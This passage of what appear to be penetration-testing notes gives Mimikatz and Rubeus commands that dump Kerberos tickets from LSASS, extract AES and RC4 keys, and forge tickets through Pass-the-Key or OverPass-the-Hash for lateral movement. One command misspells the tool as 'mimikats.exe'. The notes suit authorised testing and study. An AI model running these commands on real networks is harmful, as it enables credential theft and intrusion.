Tickets are protected by LSASS. Non admin users can only retrieve their own ticket, as an admin, it is possible to retrieve all tickets on the system.

###### Mimikatz:

Export Tickets:

```bash
mimikats.exe
privilege::debug
sekurlsa::tickets /export
```

Tickets with an `$` indicate they are used for computer accounts. Tickets without just a `@` are user tickets

###### Rubeus

Export Tickets

```bash
Rubeus.exe dump /nowrap
```

#### Pass the Key or OverPass the Hash (forging our own tickets)

We need to extract the `AES256_HMAC` and `RC4_HMAC` keys

###### Mimikatz:

```bash
mimikatz.exe
privilege::debug
sekurlsa::ekeys
```

With the information collected, we can we can perform the OverPass the Hash or Pass the Key attack using `Mimikatz` and `Rubeus`.
#### Mimikatz - Pass the Key or OverPass the Hash

```bash
mimikatz.exe
privilege::debug
sekurlsa::pth /domain:<DOMAIN> /user:<USER> /ntlm:<rc4_hmac/NTLM>
````

#### Rubeus - Pass the Key or OverPass the Hash

```bash
Rubeus.exe  asktgt /domain:<DOMAIN> /user:<USER> /aes256:<AES256_HMAC> /nowrap
```

**Note:** Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus does not.

### Pass the Ticket

With the Kerberos tickets collected, we can now perform Pass the Ticket, and moe laterally within the enviroment.




